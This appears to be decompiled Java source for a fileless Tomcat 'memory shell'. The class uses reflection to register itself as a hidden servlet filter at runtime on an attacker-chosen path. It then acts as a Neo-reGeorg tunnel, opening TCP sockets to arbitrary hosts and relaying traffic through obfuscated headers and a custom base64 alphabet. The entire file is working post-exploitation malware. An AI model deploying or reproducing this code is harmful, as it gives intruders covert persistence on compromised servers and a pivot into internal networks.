//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by Fernflower decompiler)
//

package com.summersec.x;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.Collections;
import java.util.EnumSet;
import java.util.Enumeration;
import java.util.Iterator;
import java.util.List;
import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.ServletInputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.FilterRegistration.Dynamic;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import org.apache.catalina.LifecycleState;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.util.LifecycleBase;

public class NeoreGeorgFilter implements Filter {
    public HttpServletRequest request = null;
    public HttpServletResponse response = null;
    public String cs = "UTF-8";
    public String path = "/favicondemo.ico";
    private static char[] en = "mKg4oAv5kZqU1LtrHfVOSsD6RwI/jlzBW2bEaih3pNyXuMGJxeTdcn+9P7Y8CF0Q".toCharArray();
    private static byte[] de = new byte[]{-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 54, -1, -1, -1, 27, 62, 12, 33, 39, 3, 7, 23, 57, 59, 55, -1, -1, -1, -1, -1, -1, -1, 5, 31, 60, 22, 35, 61, 46, 16, 26, 47, 1, 13, 45, 41, 19, 56, 63, 24, 20, 50, 11, 18, 32, 43, 58, 9, -1, -1, -1, -1, -1, -1, 36, 34, 52, 51, 49, 17, 2, 38, 37, 28, 8, 29, 0, 53, 4, 40, 10, 15, 21, 14, 44, 6, 25, 48, 42, 30, -1, -1, -1, -1, -1};

    public NeoreGeorgFilter() {
    }

    public boolean equals(Object obj) {
        this.parseObj(obj);
        this.path = this.request.getHeader("path");
        StringBuffer output = new StringBuffer();
        String tag_s = "->|";
        String tag_e = "|<-";

        try {
            this.response.setContentType("text/html");
            this.request.setCharacterEncoding(this.cs);
            this.response.setCharacterEncoding(this.cs);
            output.append(this.addFilter());
        } catch (Exception var7) {
            output.append("error:" + var7.toString());
        }

        try {
            this.response.getWriter().print(tag_s + output.toString() + tag_e);
            this.response.getWriter().flush();
            this.response.getWriter().close();
        } catch (Exception var6) {
        }

        return true;
    }

    public void parseObj(Object obj) {
        if (obj.getClass().isArray()) {
            Object[] data = (Object[])((Object[])obj);
            this.request = (HttpServletRequest)data[0];
            this.response = (HttpServletResponse)data[1];
        } else {
            try {
                Class clazz = Class.forName("javax.servlet.jsp.PageContext");
                this.request = (HttpServletRequest)clazz.getDeclaredMethod("getRequest").invoke(obj);
                this.response = (HttpServletResponse)clazz.getDeclaredMethod("getResponse").invoke(obj);
            } catch (Exception var8) {
                if (obj instanceof HttpServletRequest) {
                    this.request = (HttpServletRequest)obj;

                    try {
                        Field req = this.request.getClass().getDeclaredField("request");
                        req.setAccessible(true);
                        HttpServletRequest request2 = (HttpServletRequest)req.get(this.request);
                        Field resp = request2.getClass().getDeclaredField("response");
                        resp.setAccessible(true);
                        this.response = (HttpServletResponse)resp.get(request2);
                    } catch (Exception var7) {
                        try {
                            this.response = (HttpServletResponse)this.request.getClass().getDeclaredMethod("getResponse").invoke(obj);
                        } catch (Exception var6) {
                        }
                    }
                }
            }
        }

    }

    public String addFilter() throws Exception {
        ServletContext servletContext = this.request.getServletContext();
        Filter filter = this;
        String filterName = this.path;
        String url = this.path;
        if (servletContext.getFilterRegistration(filterName) == null) {
            Field contextField = null;
            ApplicationContext applicationContext = null;
            StandardContext standardContext = null;
            Field stateField = null;
            Dynamic filterRegistration = null;

            String var11;
            try {
                contextField = servletContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                applicationContext = (ApplicationContext)contextField.get(servletContext);
                contextField = applicationContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                standardContext = (StandardContext)contextField.get(applicationContext);
                stateField = LifecycleBase.class.getDeclaredField("state");
                stateField.setAccessible(true);
                stateField.set(standardContext, LifecycleState.STARTING_PREP);
                filterRegistration = servletContext.addFilter(filterName, filter);
                filterRegistration.addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, new String[]{url});
                Method filterStartMethod = StandardContext.class.getMethod("filterStart");
                filterStartMethod.setAccessible(true);
                filterStartMethod.invoke(standardContext, (Object[])null);
                stateField.set(standardContext, LifecycleState.STARTED);
                var11 = null;

                Class filterMap;
                try {
                    filterMap = Class.forName("org.apache.tomcat.util.descriptor.web.FilterMap");
                } catch (Exception var21) {
                    filterMap = Class.forName("org.apache.catalina.deploy.FilterMap");
                }

                Method findFilterMaps = standardContext.getClass().getMethod("findFilterMaps");
                Object[] filterMaps = (Object[])((Object[])findFilterMaps.invoke(standardContext));

                for(int i = 0; i < filterMaps.length; ++i) {
                    Object filterMapObj = filterMaps[i];
                    findFilterMaps = filterMap.getMethod("getFilterName");
                    String name = (String)findFilterMaps.invoke(filterMapObj);
                    if (name.equalsIgnoreCase(filterName)) {
                        filterMaps[i] = filterMaps[0];
                        filterMaps[0] = filterMapObj;
                    }
                }

                String var25 = "Success";
                return var25;
            } catch (Exception var22) {
                var11 = var22.getMessage();
            } finally {
                stateField.set(standardContext, LifecycleState.STARTED);
            }

            return var11;
        } else {
            return "Filter already exists";
        }
    }

    public static String b64en(byte[] data) {
        StringBuffer sb = new StringBuffer();
        int len = data.length;
        int i = 0;

        while(i < len) {
            int b1 = data[i++] & 255;
            if (i == len) {
                sb.append(en[b1 >>> 2]);
                sb.append(en[(b1 & 3) << 4]);
                sb.append("==");
                break;
            }

            int b2 = data[i++] & 255;
            if (i == len) {
                sb.append(en[b1 >>> 2]);
                sb.append(en[(b1 & 3) << 4 | (b2 & 240) >>> 4]);
                sb.append(en[(b2 & 15) << 2]);
                sb.append("=");
                break;
            }

            int b3 = data[i++] & 255;
            sb.append(en[b1 >>> 2]);
            sb.append(en[(b1 & 3) << 4 | (b2 & 240) >>> 4]);
            sb.append(en[(b2 & 15) << 2 | (b3 & 192) >>> 6]);
            sb.append(en[b3 & 63]);
        }

        return sb.toString();
    }

    public static byte[] b64de(String str) {
        byte[] data = str.getBytes();
        int len = data.length;
        ByteArrayOutputStream buf = new ByteArrayOutputStream(len);
        int i = 0;

        while(i < len) {
            byte b1;
            do {
                b1 = de[data[i++]];
            } while(i < len && b1 == -1);

            if (b1 == -1) {
                break;
            }

            byte b2;
            do {
                b2 = de[data[i++]];
            } while(i < len && b2 == -1);

            if (b2 == -1) {
                break;
            }

            buf.write(b1 << 2 | (b2 & 48) >>> 4);

            byte b3;
            do {
                b3 = data[i++];
                if (b3 == 61) {
                    return buf.toByteArray();
                }

                b3 = de[b3];
            } while(i < len && b3 == -1);

            if (b3 == -1) {
                break;
            }

            buf.write((b2 & 15) << 4 | (b3 & 60) >>> 2);

            byte b4;
            do {
                b4 = data[i++];
                if (b4 == 61) {
                    return buf.toByteArray();
                }

                b4 = de[b4];
            } while(i < len && b4 == -1);

            if (b4 == -1) {
                break;
            }

            buf.write((b3 & 3) << 6 | b4);
        }

        return buf.toByteArray();
    }

    static String headerkey(String str) throws Exception {
        String out = "";
        String[] var2 = str.split("-");
        int var3 = var2.length;

        for(int var4 = 0; var4 < var3; ++var4) {
            String block = var2[var4];
            out = out + block.substring(0, 1).toUpperCase() + block.substring(1);
            out = out + "-";
        }

        return out.substring(0, out.length() - 1);
    }

    boolean islocal(String url) throws Exception {
        String ip = (new URL(url)).getHost();
        Enumeration nifs = NetworkInterface.getNetworkInterfaces();

        while(nifs.hasMoreElements()) {
            NetworkInterface nif = (NetworkInterface)nifs.nextElement();
            Enumeration addresses = nif.getInetAddresses();

            while(addresses.hasMoreElements()) {
                InetAddress addr = (InetAddress)addresses.nextElement();
                if (addr instanceof Inet4Address && addr.getHostAddress().equals(ip)) {
                    return true;
                }
            }
        }

        return false;
    }

    public void init(FilterConfig filterConfig) throws ServletException {
    }

    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest)req;
        HttpServletResponse response = (HttpServletResponse)resp;
        PrintWriter out = response.getWriter();
        HttpSession application = request.getSession();
        String rUrl = request.getHeader("Zlponijrlvs");
        String cmd;
        if (rUrl != null) {
            rUrl = new String(b64de(rUrl));

            try {
                if (!this.islocal(rUrl)) {
                    response.reset();
                    cmd = request.getMethod();
                    URL u = new URL(rUrl);
                    HttpURLConnection conn = (HttpURLConnection)u.openConnection();
                    conn.setRequestMethod(cmd);
                    conn.setDoOutput(true);
                    Enumeration enu = request.getHeaderNames();
                    List<String> keys = Collections.list(enu);
                    Collections.reverse(keys);
                    Iterator var34 = keys.iterator();

                    while(var34.hasNext()) {
                        String key = (String)var34.next();
                        if (!key.equalsIgnoreCase("Zlponijrlvs")) {
                            String value = request.getHeader(key);
                            conn.setRequestProperty(headerkey(key), value);
                        }
                    }

                    byte[] buffer = new byte[1024];
                    int i;
                    if (request.getContentLength() != -1) {
                        OutputStream output;
                        try {
                            output = conn.getOutputStream();
                        } catch (Exception var21) {
                            response.setHeader("Vkh", "8MfxUTr1VG_uaKBPdfzufZ52oPQmVGkIC9");
                            return;
                        }

                        ServletInputStream inputStream = request.getInputStream();

                        while((i = inputStream.read(buffer)) != -1) {
                            output.write(buffer, 0, i);
                        }

                        output.flush();
                        output.close();
                    }

                    Iterator var39 = conn.getHeaderFields().keySet().iterator();

                    while(var39.hasNext()) {
                        String key = (String)var39.next();
                        if (key != null && !key.equalsIgnoreCase("Content-Length")) {
                            String value = conn.getHeaderField(key);
                            response.setHeader(key, value);
                        }
                    }

                    InputStream hin;
                    if (conn.getResponseCode() < 400) {
                        hin = conn.getInputStream();
                    } else {
                        hin = conn.getErrorStream();
                        if (hin == null) {
                            response.setStatus(200);
                            return;
                        }
                    }

                    response.setStatus(conn.getResponseCode());

                    while((i = hin.read(buffer)) != -1) {
                        byte[] data = new byte[i];
                        System.arraycopy(buffer, 0, data, 0, i);
                        out.write(new String(data));
                    }

                    return;
                }
            } catch (Exception var24) {
                var24.getMessage();
            }
        }

        response.resetBuffer();
        response.setStatus(200);
        cmd = request.getHeader("Hlbfh");
        if (cmd != null) {
            String mark = cmd.substring(0, 22);
            cmd = cmd.substring(22);
            response.setHeader("Jzyu", "5DZkJoYjLbRIqlWWzZ");
            int bytesRead;
            if (cmd.compareTo("2p1yqRJS7HDc") == 0) {
                try {
                    String[] target_ary = (new String(b64de(request.getHeader("Bpmk")))).split("\\|");
                    String target = target_ary[0];
                    bytesRead = Integer.parseInt(target_ary[1]);
                    SocketChannel socketChannel = SocketChannel.open();
                    socketChannel.connect(new InetSocketAddress(target, bytesRead));
                    socketChannel.configureBlocking(false);
                    application.setAttribute(mark, socketChannel);
                    response.setHeader("Jzyu", "5DZkJoYjLbRIqlWWzZ");
                } catch (Exception var20) {
                    response.setHeader("Vkh", "ab0dOo8ZQaoYuWqf2ovGCpAkiafntyRljjMfG");
                    response.setHeader("Jzyu", "kdu05VN1tUY6F5b0j73zC9QuPVYfER73BEFzVfMt6SIy_KEsumgaRR");
                }
            } else {
                SocketChannel socketChannel;
                if (cmd.compareTo("h9AYzXWL0ombDQUMmsJPJSjRyPeDo2gHSnnWGKQJ3hi5") == 0) {
                    socketChannel = (SocketChannel)application.getAttribute(mark);

                    try {
                        socketChannel.socket().close();
                    } catch (Exception var19) {
                    }

                    application.removeAttribute(mark);
                } else {
                    byte[] data;
                    if (cmd.compareTo("sDOD5hAhAyHLqLS0n") == 0) {
                        socketChannel = (SocketChannel)application.getAttribute(mark);

                        try {
                            ByteBuffer buf = ByteBuffer.allocate(513);

                            for(bytesRead = socketChannel.read(buf); bytesRead > 0; bytesRead = socketChannel.read(buf)) {
                                data = new byte[bytesRead];
                                System.arraycopy(buf.array(), 0, data, 0, bytesRead);
                                out.write(b64en(data));
                            }

                            response.setHeader("Jzyu", "5DZkJoYjLbRIqlWWzZ");
                        } catch (Exception var23) {
                            response.setHeader("Jzyu", "kdu05VN1tUY6F5b0j73zC9QuPVYfER73BEFzVfMt6SIy_KEsumgaRR");
                        }
                    } else if (cmd.compareTo("81eneZlfr3BUPRNWlfq7lxOFqMPEWbRcFr2wLxTTv") == 0) {
                        socketChannel = (SocketChannel)application.getAttribute(mark);

                        try {
                            int readlen = request.getContentLength();
                            byte[] buff = new byte[readlen];
                            request.getInputStream().read(buff, 0, readlen);
                            data = b64de(new String(buff));
                            ByteBuffer buf = ByteBuffer.allocate(data.length);
                            buf.put(data);
                            buf.flip();

                            while(buf.hasRemaining()) {
                                socketChannel.write(buf);
                            }

                            response.setHeader("Jzyu", "5DZkJoYjLbRIqlWWzZ");
                        } catch (Exception var22) {
                            response.setHeader("Vkh", "QFVgwWy5chBAXI");
                            response.setHeader("Jzyu", "kdu05VN1tUY6F5b0j73zC9QuPVYfER73BEFzVfMt6SIy_KEsumgaRR");
                            socketChannel.socket().close();
                        }
                    }
                }
            }
        } else {
            out.write("<!-- x0zdyym2QlZu4NbrzwUJNJrZBHydgYNXMaX -->");
        }

    }

    public void destroy() {
    }
}
